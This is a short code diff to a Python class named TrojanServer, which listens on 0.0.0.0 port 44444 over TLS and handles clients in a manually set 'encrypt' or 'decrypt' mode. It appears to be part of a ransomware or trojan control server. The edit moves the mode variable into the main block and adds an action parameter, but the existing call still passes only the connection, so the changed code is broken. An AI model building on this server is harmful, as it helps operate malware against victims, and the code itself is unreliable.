@@ -34,8 +34,7 @@ class  TrojanServer:
                     print(f"Connection from {address} secured with TLS")
                     self.handle_client(conn)
 
-    def handle_client(self, conn):
-        action = "encrypt"  # "encrypt or "decrypt" - set this manually
+    def handle_client(self, conn, action):
         if action == "encrypt":
             key = self._handle_encrypt(conn)
         else:
@@ -104,5 +103,6 @@ class  TrojanServer:
 
 
 if __name__ == "__main__":
+    action = "encrypt"  # "encrypt or "decrypt" - set this manually
     server = TrojanServer("0.0.0.0", 44444, "path/to/cert.pem", "path/to/key.pem")
     server.start()
